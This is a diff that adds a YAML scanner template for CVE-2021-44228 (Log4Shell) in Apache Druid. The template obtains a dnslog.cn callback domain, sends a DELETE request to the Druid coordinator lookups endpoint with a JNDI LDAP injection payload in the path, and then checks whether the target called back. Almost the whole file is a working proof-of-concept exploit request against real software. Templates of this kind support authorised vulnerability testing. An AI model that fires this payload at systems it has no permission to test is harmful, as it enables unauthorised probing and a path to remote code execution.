@@ -1,0 +1,29 @@
+name: Apache Druid Log4shell CVE-2021-44228
+manual: true
+query: title=="Apache Druid"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getdomain.php
+    expression: response.status == 200
+    output:
+      dnstest: response.body
+  r1:
+    request:
+      method: DELETE
+      path: /druid/coordinator/v1/lookups/config/$%7bjndi:ldap:%2f%2f{{dnstest}}%2ftea%7d
+    expression: response.status >= 200
+  r2:
+    request:
+      method: GET
+      path: http://www.dnslog.cn/getrecords.php
+    expression: response.status == 200 && response.body.bcontains(b"{{dnstest}}")
+expression: r0() && r1() && r2()
+detail:
+  author: aetkrad
+  links:
+  - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
+  description: Apache Druid存在log4j漏洞。
+  tags: rce
